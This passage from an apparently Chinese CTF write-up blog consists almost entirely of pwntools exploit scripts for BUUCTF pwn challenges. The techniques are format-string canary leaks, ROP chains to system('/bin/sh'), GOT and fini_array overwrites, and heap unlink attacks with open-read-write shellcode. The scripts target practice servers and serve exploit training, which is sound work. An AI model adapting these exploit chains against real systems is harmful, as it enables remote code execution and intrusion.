sh &#x3D; process(&quot;.&#x2F;web_of_sci_volga_2016&quot;)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;home&#x2F;pig&#x2F;Pig&#x2F;CTF&#x2F;BUUCTF&#x2F;BUUCTF_libc&#x2F;x64_libc.so.6&quot;)</span><br><span class="line">	pop_rdi_ret &#x3D; 0x4010a3</span><br><span class="line">	pop_rsi_r15_ret &#x3D; 0x4010a1</span><br><span class="line">	payload &#x3D; &quot;\x00&quot;</span><br><span class="line">	sh.recvuntil(&quot;name&quot;)</span><br><span class="line">	sh.sendline(&quot;%43$p&quot;)</span><br><span class="line">	sh.recvuntil(&quot;0x&quot;)</span><br><span class="line">	canary &#x3D; int(sh.recvuntil(&quot;,&quot;,True),16)</span><br><span class="line">	for i in range(9):</span><br><span class="line">		sh.recvuntil(&quot;:&quot;)</span><br><span class="line">		sh.sendline(&quot;0&quot;)</span><br><span class="line">	offset &#x3D; 0xa0 + 8</span><br><span class="line">	payload &#x3D; &#39;&#39;</span><br><span class="line">	payload &#x3D; payload.ljust(0xa0 - 0x18,&#39;a&#39;)</span><br><span class="line">	payload +&#x3D; p64(canary)</span><br><span class="line">	payload &#x3D; payload.ljust(offset,&#39;a&#39;)</span><br><span class="line">	payload +&#x3D; p64(pop_rdi_ret)</span><br><span class="line">	payload +&#x3D; p64(elf.got[&#39;__libc_start_main&#39;])	</span><br><span class="line">	payload +&#x3D; p64(elf.plt[&#39;puts&#39;])</span><br><span class="line">	payload +&#x3D; p64(0x400FCD)</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sh.recvuntil(&quot;: &quot;)</span><br><span class="line">	__libc_start_main &#x3D; u64(sh.recvuntil(&quot;\x7f&quot;).ljust(8,&#39;\x00&#39;))</span><br><span class="line">	libc &#x3D; __libc_start_main - lib.symbols[&#39;__libc_start_main&#39;]</span><br><span class="line">	system &#x3D; libc + lib.symbols[&#39;system&#39;]</span><br><span class="line">	binsh &#x3D; libc + lib.search(&quot;&#x2F;bin&#x2F;sh\x00&quot;).next()</span><br><span class="line">	sh.recvuntil(&quot;name&quot;)</span><br><span class="line">	sh.sendline(&quot;%43$p&quot;)</span><br><span class="line">	sh.recvuntil(&quot;0x&quot;)</span><br><span class="line">	canary &#x3D; int(sh.recvuntil(&quot;,&quot;,True),16)</span><br><span class="line">	for i in range(9):</span><br><span class="line">                sh.recvuntil(&quot;:&quot;)</span><br><span class="line">                sh.sendline(&quot;0&quot;)</span><br><span class="line">	offset &#x3D; 0xa0 + 8</span><br><span class="line">	payload &#x3D; &#39;&#39;</span><br><span class="line">	payload &#x3D; payload.ljust(0xa0 - 0x18,&#39;a&#39;)</span><br><span class="line">	payload +&#x3D; p64(canary)</span><br><span class="line">	payload &#x3D; payload.ljust(offset,&#39;a&#39;)</span><br><span class="line">	payload +&#x3D; p64(pop_rdi_ret)</span><br><span class="line">	payload +&#x3D; p64(binsh)</span><br><span class="line">	payload +&#x3D; p64(system)</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;pwn.buuoj.cn&quot;,20098,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x44-ciscn-2019-sw-1">0x44 ciscn_2019_sw_1</h2>
<h3 id="printf花式溢出漏洞，无限循环">printf花式溢出漏洞，无限循环</h3>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;i386&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;ciscn_2019_sw_1&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;ciscn_2019_sw_1&quot;)</span><br><span class="line">		</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">	main &#x3D; 0x08048534</span><br><span class="line">	fini &#x3D; 0x0804979C</span><br><span class="line">	system_plt &#x3D; 0x080483D0</span><br><span class="line">	offset &#x3D; 0</span><br><span class="line">	payload &#x3D; p32(fini + 2) + p32(fini) + p32(elf.got[&#39;printf&#39;] + 2) + p32(elf.got[&#39;printf&#39;])</span><br><span class="line">	payload +&#x3D; &#39;%.&#39; + str((main &gt;&gt; 16) - 4 - 5 - 8) + &#39;d%4$hn&#39;</span><br><span class="line">	payload +&#x3D; &#39;%6$hn&#39;</span><br><span class="line">	payload +&#x3D; &quot;%.&quot; + str(system_plt % 0x10000 - (main &gt;&gt; 16)) + &quot;d%7$hn&quot;</span><br><span class="line">	payload +&#x3D; &quot;%.&quot; + str(main % 0x10000 - (system_plt % 0x10000)) + &quot;d%5$hn&quot;</span><br><span class="line">	log.success(&quot;puts_got: &quot; + hex(elf.got[&#39;puts&#39;]))</span><br><span class="line">	log.success(&quot;fini: &quot; + hex(0x0804979C))</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	sh.sendline(&quot;&#x2F;bin&#x2F;sh\x00&quot;)	</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;pwn.buuoj.cn&quot;,20127,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x45-中关村2019-one-string">0x45 [中关村2019]one_string</h2>
<h3 id="orw">orw</h3>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import base64</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;i386&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;pwn&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">delay &#x3D; 0.1</span><br><span class="line">data &#x3D; &#39;&#39;</span><br><span class="line">data2 &#x3D; &#39;&#39;</span><br><span class="line">def add(size,content):</span><br><span class="line">    global data</span><br><span class="line">    global data2</span><br><span class="line">    sh.sendline(&quot;1&quot;)</span><br><span class="line">    data +&#x3D; base64.b64encode(&quot;1&quot;)</span><br><span class="line">    data2 +&#x3D; &quot;1\n&quot;</span><br><span class="line">    sleep(delay)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    data +&#x3D; base64.b64encode(str(size))</span><br><span class="line">    data2 +&#x3D; str(size) + &quot;\n&quot;</span><br><span class="line">    sleep(delay)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line">    data +&#x3D; base64.b64encode(content)</span><br><span class="line">    data2 +&#x3D; content + &quot;\n&quot;</span><br><span class="line">    sleep(delay)</span><br><span class="line">def edit(idx,content):</span><br><span class="line">    global data</span><br><span class="line">    global data2</span><br><span class="line">    sh.sendline(&quot;3&quot;)</span><br><span class="line">    data +&#x3D; base64.b64encode(&quot;3&quot;)</span><br><span class="line">    data2 +&#x3D; &quot;3\n&quot;</span><br><span class="line">    sleep(delay)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    data +&#x3D; base64.b64encode(str(idx))</span><br><span class="line">    data2 +&#x3D; str(idx) + &quot;\n&quot;</span><br><span class="line">    sleep(delay)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line">    data +&#x3D; base64.b64encode(content)</span><br><span class="line">    data2 +&#x3D; content + &quot;\n&quot;</span><br><span class="line">def free(idx):</span><br><span class="line">    global data</span><br><span class="line">    global data2</span><br><span class="line">    sh.sendline(&quot;2&quot;)</span><br><span class="line">    data2 +&#x3D; &quot;2\n&quot;</span><br><span class="line">    data +&#x3D; base64.b64encode(&quot;2&quot;)</span><br><span class="line">    sleep(delay)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    data2 +&#x3D; str(idx) + &quot;\n&quot;</span><br><span class="line">    data +&#x3D; base64.b64encode(str(idx))</span><br><span class="line">    sleep(delay)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">    global data</span><br><span class="line">    global data2</span><br><span class="line">    global sh</span><br><span class="line">    global lib</span><br><span class="line">    if(debug &#x3D;&#x3D; 1):</span><br><span class="line">        sh &#x3D; process(&quot;.&#x2F;pwn_back&quot;)</span><br><span class="line">    else:</span><br><span class="line">        sh &#x3D; remote(ip,port)</span><br><span class="line">    malloc_hook &#x3D; 0x80EA4D8</span><br><span class="line">    chunk_list &#x3D; 0x080EBA00</span><br><span class="line">    add(0x80,&#39;\x99&#39;*0x64)</span><br><span class="line">    add(0x80,&#39;\x99&#39;*0x64)</span><br><span class="line">    add(0x80,&#39;\x99&#39;*0x64)</span><br><span class="line">    add(0x84,&#39;\x11&#39;*0x84)</span><br><span class="line">    add(0xf8,&#39;\x22&#39;*0xf8)</span><br><span class="line">    add(0x24,&#39;\x33&#39;*0x24)</span><br><span class="line">    edit(3,&#39;\x44&#39;*0xf6)</span><br><span class="line">    payload &#x3D; p32(0xdeadbeef) + p32(0x81) + p32(0x080EBA40 + 4*3 - 12) + p32(0x080EBA40 +3*4 - 8)</span><br><span class="line">    payload &#x3D; payload.ljust(0x80,&#39;\x44&#39;) + p32(0x80)</span><br><span class="line">    edit(3,payload)</span><br><span class="line">    free(4)</span><br><span class="line">    open_shellcode &#x3D; &quot;xor ecx,ecx;xor edx,edx;mov eax,0x5;push 0x00000067;push 0x616c662f;mov ebx,esp;int 0x80;&quot;</span><br><span class="line">    read_shellcode &#x3D; &quot;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x40;int 0x80;&quot;</span><br><span class="line">    write_shellcode &#x3D; &quot;mov eax,0x4;mov ebx,0x1;mov edx,0x40;int 0x80;&quot;</span><br><span class="line">    shellcode &#x3D; open_shellcode + read_shellcode + write_shellcode</span><br><span class="line">    payload &#x3D; asm(shellcode)</span><br><span class="line">    edit(3,p32(0x80eba00))</span><br><span class="line">    edit(0,p32(0x500)*6)</span><br><span class="line">    edit(3,p32(0x80EA4D8)*2 + p32(0x80eba60))</span><br><span class="line">    edit(2,payload)</span><br><span class="line">    edit(1,p32(0x80eba60))</span><br><span class="line">    add(0x55,&quot;&quot;)</span><br><span class="line">    sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    pwn(&quot;node1.buuoj.cn&quot;,28948,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x46-bjdctf-2020-babyrop">0x46 bjdctf_2020_babyrop</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># Author xynm</span><br><span class="line">#import xynm_pwn_util</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">from PwnContext import *</span><br><span class="line">from time import *</span><br><span class="line">from pwn import *</span><br><span class="line">#log_level[&#39;CRITICAL&#39;, &#39;DEBUG&#39;, &#39;ERROR&#39;, &#39;INFO&#39;, &#39;NOTSET&#39;, &#39;WARN&#39;, &#39;WARNING&#39;]</span><br><span class="line">context.log_level &#x3D; &#39;CRITICAL&#39;</span><br><span class="line">remote_ip        &#x3D; b&#39;127.0.0.1&#39;</span><br><span class="line">remote_port      &#x3D; 9999</span><br><span class="line">context.terminal &#x3D; [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]</span><br><span class="line">binary_file      &#x3D; &#39;.&#x2F;%s&#39; % &quot;bjdctf_2020_babyrop&quot;</span><br><span class="line">remote_libc_file &#x3D; &quot;libc-2.23_ubuntu16_x64.so&quot;</span><br><span class="line">#cp &#x2F;tools&#x2F;libc&#x2F; .&#x2F;libc-2.23_ubuntu16_x64.so</span><br><span class="line">def exploit(sh,remote &#x3D; False,awd &#x3D; False):</span><br><span class="line">    if awd:</span><br><span class="line">        context.log_level &#x3D; b&quot;CRITICAL&quot;</span><br><span class="line">        ctx.binary &#x3D; &#39;.&#x2F;%s&#39; % &quot;bjdctf_2020_babyrop&quot;</span><br><span class="line">        ctx.remote_libc &#x3D; &quot;libc-2.23_ubuntu16_x64.so&quot;</span><br><span class="line">        #ctx.remote_libc &#x3D;b&#39;&#x2F;tools&#x2F;libc-database-master&#x2F;db&#x2F;libc6_2.23-0ubuntu10_amd64.so&#39;</span><br><span class="line">        #ctx.remote_libc &#x3D;b&#39;&#x2F;tools&#x2F;libc&#x2F;libc-2.23_ubuntu16_x32.so&#39;</span><br><span class="line">    elf &#x3D; ctx.binary</span><br><span class="line">    if awd or remote:</span><br><span class="line">        lib &#x3D; ctx.remote_libc</span><br><span class="line">    else:</span><br><span class="line">        lib &#x3D; ctx.libc</span><br><span class="line">    def debug(gdb_script &#x3D; &quot;&quot;):</span><br><span class="line">        gdb.attach(sh,gdb_script)</span><br><span class="line">    if context.arch &#x3D;&#x3D; b&quot;amd64&quot;:</span><br><span class="line">        pop_rdi_ret &#x3D; elf.search(asm(b&quot;pop rdi ; ret&quot;)).next()</span><br><span class="line">        pop_rsi_r15_ret &#x3D; elf.search(asm(b&quot;pop rsi ; pop r15 ; ret&quot;)).next()</span><br><span class="line">    elif context.arch &#x3D;&#x3D; b&quot;i386&quot;:</span><br><span class="line">        pop_ebp_ret &#x3D; elf.search(asm(b&quot;pop ebp ; ret&quot;)).next()</span><br><span class="line">        pop3_ret    &#x3D; elf.search(asm(b&quot;pop esi ; pop edi ; pop ebp ; ret&quot;)).next()</span><br><span class="line">    s       &#x3D; lambda data               :sh.send(str(data))</span><br><span class="line">    sa      &#x3D; lambda delim,data         :sh.sendafter(str(delim), str(data))</span><br><span class="line">    sl      &#x3D; lambda data               :sh.sendline(str(data))</span><br><span class="line">    sla     &#x3D; lambda delim,data         :sh.sendlineafter(str(delim), str(data))</span><br><span class="line">    r       &#x3D; lambda numb&#x3D;4096          :sh.recv(numb)</span><br><span class="line">    ru      &#x3D; lambda delims, drop&#x3D;True  :sh.recvuntil(delims, drop)</span><br><span class="line">    irt     &#x3D; lambda                    :sh.interactive()</span><br><span class="line">    uu32    &#x3D; lambda data               :u32(data.ljust(4, b&#39;\x00&#39;))</span><br><span class="line">    uu64    &#x3D; lambda data               :u64(data.ljust(8, b&#39;\x00&#39;))</span><br><span class="line">    ru7f    &#x3D; lambda                    :u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#39;\x00&#39;))</span><br><span class="line">    ruf7    &#x3D; lambda                    :u32(sh.recvuntil(&quot;\xf7&quot;)[-4:].ljust(4,b&#39;\x00&#39;))</span><br><span class="line">    lg      &#x3D; lambda data               :log.success(data)</span><br><span class="line">    offset &#x3D; 0x28</span><br><span class="line">    payload &#x3D; offset * &quot;a&quot;</span><br><span class="line">    payload +&#x3D; p64(pop_rdi_ret)</span><br><span class="line">    payload +&#x3D; p64(elf.got[&#39;__libc_start_main&#39;])</span><br><span class="line">    payload +&#x3D; p64(elf.plt[&#39;puts&#39;])</span><br><span class="line">    payload +&#x3D; p64(elf.symbols[&#39;main&#39;])</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    __libc_start_main &#x3D; ru7f()</span><br><span class="line">    libc &#x3D; __libc_start_main - lib.symbols[b&#39;__libc_start_main&#39;]</span><br><span class="line">    lib.address &#x3D; libc</span><br><span class="line">    system &#x3D; lib.symbols[b&#39;system&#39;]</span><br><span class="line">    binsh &#x3D; lib.search(b&quot;&#x2F;bin&#x2F;sh\x00&quot;).next()</span><br><span class="line">    __free_hook &#x3D; lib.symbols[b&#39;__free_hook&#39;]</span><br><span class="line">    __malloc_hook &#x3D; lib.symbols[b&#39;__malloc_hook&#39;]</span><br><span class="line">    __realloc_hook &#x3D; lib.symbols[b&#39;__realloc_hook&#39;]</span><br><span class="line">    one_gadget &#x3D; []</span><br><span class="line">    offset &#x3D; 0x28</span><br><span class="line">    payload &#x3D; offset * &quot;a&quot;</span><br><span class="line">    payload +&#x3D; p64(pop_rdi_ret)</span><br><span class="line">    payload +&#x3D; p64(binsh)</span><br><span class="line">    payload +&#x3D; p64(system)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    if awd &#x3D;&#x3D; False:</span><br><span class="line">        irt()</span><br><span class="line">if __name__ &#x3D;&#x3D; b&quot;__main__&quot;:</span><br><span class="line">    exploit(remote(remote_ip,remote_port),remote&#x3D;True)</span><br></pre></td></tr></table></figure>
<h2 id="0x47-bamboobox">0x47 bamboobox</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># Author xynm</span><br><span class="line">#import xynm_pwn_util</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">from PwnContext import *</span><br><span class="line">from time import *</span><br><span class="line">from pwn import *</span><br><span class="line">#log_level[&#39;CRITICAL&#39;, &#39;DEBUG&#39;, &#39;ERROR&#39;, &#39;INFO&#39;, &#39;NOTSET&#39;, &#39;WARN&#39;, &#39;WARNING&#39;]</span><br><span class="line">context.log_level &#x3D; &#39;CRITICAL&#39;</span><br><span class="line">remote_ip        &#x3D; b&#39;node3.buuoj.cn&#39;</span><br><span class="line">remote_port      &#x3D; 26956</span><br><span class="line">context.terminal &#x3D; [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]</span><br><span class="line">binary_file      &#x3D; &#39;.&#x2F;%s&#39; % &quot;bamboobox&quot;</span><br><span class="line">remote_libc_file &#x3D; &quot;libc-2.23.so&quot;</span><br><span class="line">#cp &#x2F;tools&#x2F;libc&#x2F; .&#x2F;libc-2.23.so</span><br><span class="line">gdb_attach_remote_port &#x3D; 55667</span><br><span class="line">def exploit(sh,remote &#x3D; False,awd &#x3D; False):</span><br><span class="line">    if awd:</span><br><span class="line">        context.log_level &#x3D; b&quot;CRITICAL&quot;</span><br><span class="line">        ctx.binary &#x3D; &#39;.&#x2F;%s&#39; % &quot;bamboobox&quot;</span><br><span class="line">        ctx.remote_libc &#x3D; &quot;libc-2.23.so&quot;</span><br><span class="line">        #ctx.remote_libc &#x3D;b&#39;&#x2F;tools&#x2F;libc-database-master&#x2F;db&#x2F;libc6_2.23-0ubuntu10_amd64.so&#39;</span><br><span class="line">        #ctx.remote_libc &#x3D;b&#39;&#x2F;tools&#x2F;libc&#x2F;libc-2.23_ubuntu16_x32.so&#39;</span><br><span class="line">    elf &#x3D; ctx.binary</span><br><span class="line">    if awd or remote:</span><br><span class="line">        lib &#x3D; ctx.remote_libc</span><br><span class="line">    else:</span><br><span class="line">        lib &#x3D; ctx.libc</span><br><span class="line">    def debug(gdb_script &#x3D; &quot;&quot;):</span><br><span class="line">        gdb.attach(sh,gdb_script)</span><br><span class="line">    if context.arch &#x3D;&#x3D; b&quot;amd64&quot;:</span><br><span class="line">        pop_rdi_ret &#x3D; elf.search(asm(b&quot;pop rdi ; ret&quot;)).next()</span><br><span class="line">        pop_rsi_r15_ret &#x3D; elf.search(asm(b&quot;pop rsi ; pop r15 ; ret&quot;)).next()</span><br><span class="line">    elif context.arch &#x3D;&#x3D; b&quot;i386&quot;:</span><br><span class="line">        pop_ebp_ret &#x3D; elf.search(asm(b&quot;pop ebp ; ret&quot;)).next()</span><br><span class="line">        pop3_ret    &#x3D; elf.search(asm(b&quot;pop esi ; pop edi ; pop ebp ; ret&quot;)).next()</span><br><span class="line">    s       &#x3D; lambda data               :sh.send(str(data))</span><br><span class="line">    sa      &#x3D; lambda delim,data         :sh.sendafter(str(delim), str(data))</span><br><span class="line">    sl      &#x3D; lambda data               :sh.sendline(str(data))</span><br><span class="line">    sla     &#x3D; lambda delim,data         :sh.sendlineafter(str(delim), str(data))</span><br><span class="line">    r       &#x3D; lambda numb&#x3D;4096          :sh.recv(numb)</span><br><span class="line">    ru      &#x3D; lambda delims, drop&#x3D;True  :sh.recvuntil(delims, drop)</span><br><span class="line">    irt     &#x3D; lambda                    :sh.interactive()</span><br><span class="line">    uu32    &#x3D; lambda data               :u32(data.ljust(4, b&#39;\x00&#39;))</span><br><span class="line">    uu64    &#x3D; lambda data               :u64(data.ljust(8, b&#39;\x00&#39;))</span><br><span class="line">    ru7f    &#x3D; lambda                    :u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#39;\x00&#39;))</span><br><span class="line">    ruf7    &#x3D; lambda                    :u32(sh.recvuntil(&quot;\xf7&quot;)[-4:].ljust(4,b&#39;\x00&#39;))</span><br><span class="line">    lg      &#x3D; lambda data               :log.success(data)</span><br><span class="line">    def add(size,content):</span><br><span class="line">        sla(&quot;:&quot;,&quot;2&quot;)</span><br><span class="line">        sla(&quot;:&quot;,str(size))</span><br><span class="line">        sa(&quot;:&quot;,str(content))</span><br><span class="line">    def show():</span><br><span class="line">        sla(&quot;:&quot;,&quot;1&quot;)</span><br><span class="line">    def edit(idx,size,content):</span><br><span class="line">        sla(&quot;:&quot;,&quot;3&quot;)</span><br><span class="line">        sla(&quot;:&quot;,str(idx))</span><br><span class="line">        sla(&quot;:&quot;,str(size))</span><br><span class="line">        sa(&quot;:&quot;,content)</span><br><span class="line">    def free(idx):</span><br><span class="line">        sla(&quot;:&quot;,&quot;4&quot;)</span><br><span class="line">        sla(&quot;:&quot;,str(idx))</span><br><span class="line">    chunk_list &#x3D; 0x6020C8</span><br><span class="line">    add(0x18,&#39;a&#39;)</span><br><span class="line">    add(0x18,&#39;a&#39;)</span><br><span class="line">    add(0x18,&#39;a&#39;)</span><br><span class="line">    add(0x88,&#39;\x11&#39; * 0x87)</span><br><span class="line">    add(0xf8,&#39;\x12&#39; * 0xf7)</span><br><span class="line">    add(0x18,&#39;\x13&#39; * 0x17)</span><br><span class="line">    payload &#x3D; p64(0) + p64(0x81)</span><br><span class="line">    payload +&#x3D; p64(0x6020f8 - 0x18) + p64(0x6020f8 - 0x10)</span><br><span 